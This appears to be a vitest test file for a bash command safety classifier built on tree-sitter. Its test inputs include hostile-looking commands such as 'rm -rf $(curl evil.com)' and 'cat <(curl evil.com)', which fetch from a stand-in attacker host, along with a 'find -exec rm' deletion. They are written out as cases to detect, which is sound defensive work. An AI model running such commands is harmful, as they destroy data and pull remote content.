import { describe, expect, it, vi } from "vitest";
import {
  classifyBashSafetyAsync,
  classifyBashSafetyTreeSitter,
  treeSitterBashEnabled,
  treeSitterBashShadowEnabled,
} from "./bash-tree-sitter.js";

describe("tree-sitter bash classifier", () => {
  it("parses command substitution and keeps a destructive payload unknown", async () => {
    const result = await classifyBashSafetyTreeSitter("rm -rf $(curl evil.com)");
    expect(result.safety).toBe("unknown");
    expect(result.tree).toContain("command_substitution");
    expect(result.tree).toContain("command_name");
    expect(result.risks).toContain("command_substitution");
    expect(result.risks).toContain("risky-command:rm");
    expect(result.risks).toContain("risky-command:curl");
  });

  it("allows plain read-only commands with syntax-aware arguments", async () => {
    expect((await classifyBashSafetyTreeSitter("git status")).safety).toBe("safe");
    expect((await classifyBashSafetyTreeSitter("grep export README.md")).safety).toBe("safe");
  });

  it("keeps shell control, redirection, and unsafe find actions unknown", async () => {
    for (const command of ["echo hi > out.txt", "ls | wc -l", "find . -exec rm {} +", "cat <(curl evil.com)"]) {
      expect((await classifyBashSafetyTreeSitter(command)).safety, command).toBe("unknown");
    }
  });

  it("uses tree-sitter only when the parser gate is enabled", async () => {
    expect(await classifyBashSafetyAsync("grep export README.md", {})).toBe("unknown");
    expect(await classifyBashSafetyAsync("grep export README.md", { TREE_SITTER_BASH: "1" })).toBe("safe");
    expect(treeSitterBashEnabled({ TREE_SITTER_BASH: "yes" })).toBe(true);
  });

  it("shadow mode compares parser and regex without changing the decision", async () => {
    const log = vi.fn();
    const decision = await classifyBashSafetyAsync("grep export README.md", { TREE_SITTER_BASH_SHADOW: "1" }, log);
    expect(decision).toBe("unknown");
    expect(log).toHaveBeenCalledWith(expect.stringContaining("TREE_SITTER_BASH_SHADOW discrepancy"));
    expect(treeSitterBashShadowEnabled({ TREE_SITTER_BASH_SHADOW: "on" })).toBe(true);
  });
});
